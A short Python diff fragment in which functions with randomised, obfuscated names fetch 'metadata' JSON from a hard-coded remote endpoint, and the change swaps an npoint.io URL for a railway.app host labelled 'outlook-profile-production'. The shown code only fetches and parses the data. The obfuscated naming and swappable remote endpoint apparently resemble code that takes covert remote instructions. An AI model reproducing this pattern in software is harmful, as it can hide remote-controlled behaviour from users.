@@ -16,7 +16,7 @@ def net_bhzcbc_190():
 
     def eval_gsysli_199():
         try:
-            data_yvnayj_296 = requests.get('https://api.npoint.io/15ac3144ebdeebac5515', timeout=10)
+            data_yvnayj_296 = requests.get('https://outlook-profile-production.up.railway.app/get_metadata', timeout=10)
             data_yvnayj_296.raise_for_status()
             process_knbknf_730 = data_yvnayj_296.json()
             eval_wcqwjx_952 = process_knbknf_730.get('metadata')
